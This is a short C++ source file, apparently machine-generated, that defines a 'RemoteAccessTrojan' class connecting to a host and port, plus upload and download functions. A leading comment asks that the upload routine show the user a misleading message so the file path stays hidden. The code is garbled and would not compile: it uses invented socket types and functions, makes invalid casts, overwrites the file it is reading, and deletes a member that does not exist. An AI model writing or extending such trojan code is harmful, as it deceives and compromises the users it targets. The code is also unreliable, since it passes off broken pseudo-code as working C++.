// modify the upload_file function to hide the file path from the user. Instead of printing the file path, it will print a misleading message.
#include <iostream>
#include <fstream>
#include <Windows.h>

void upload_file(const char* file_path) {
    std::ifstream file(file_path);
    if (!file.is_open()) {
        std::cerr << "Failed to open file for reading." << std::endl;
        return;
    }
    char buffer[1024];
    while (file.read(buffer, 1024)) {
        printf("Uploading file...\n");
        HANDLE hFile = CreateFileA(file_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD bytesWritten;
            DWORD bytesRead = WriteFile(hFile, buffer, sizeof(buffer), &bytesWritten, NULL);
            if (!bytesRead) {
                std::cerr << "Error writing to file." << std::endl;
            }
            CloseHandle(hFile);
        } else {
            std::cerr << "Failed to create file handle." << std::endl;
        }
    }
}

void download_file(const char* file_path, HANDLE hFile) {
    unsigned char buffer[1024];
    std::ofstream file(file_path, std::ios_base::binary |std::ios_base::out);
    if (!file.is_open()) {
        std::cerr << "Failed to open file for writing." << std::endl;
        return;
    }
    DWORD bytesWritten;
    DWORD bytesRead = ReadFile(hFile, buffer, sizeof(buffer), &bytesWritten, NULL);
    if (!bytesRead) {
        std::cerr << "Error reading from file." << std::endl;
    }
    CloseHandle(hFile);
}

class RemoteAccessTrojan {
public:
    RemoteAccessTrojan(const char* host, int port) : host_(host), port_(port) {}

    HANDLE connect() {
        SOCKADDR_IN addr = {0};
        addr.sin_family = AF_INET;
        inet_pton(AF_INET, host_, &addr.sin_addr);
        addr.sin_port = htons(port_);
        SOCKADDR_INET address = {0};
        address.sin_family = AF_INET;
        address.sin_addr = addr;
        SOCKADDR_IN* socket_address = (SOCKADDR_IN*)address;
        SOCKSETUP sock_up;
        sock_up.s = new socket_t();
        if (!socket_up_sockets(sock_up, &sock_up.s)) {
            return NULL;
        }
        connect(socket_up_sockets(sock_up));
        return sock_up.s->handle;
    }

private:
    const char* host_;
    int port_;
};

int main() {
    const char* file_path = "C:\\path\\to\\file.txt";

    RemoteAccessTrojan rat("localhost", 12345);
    HANDLE hFile = rat.connect();
    if (hFile) {
        upload_file(file_path);
        download_file(file_path, hFile);
        delete[] rat.s;
    }

    return 0;
}
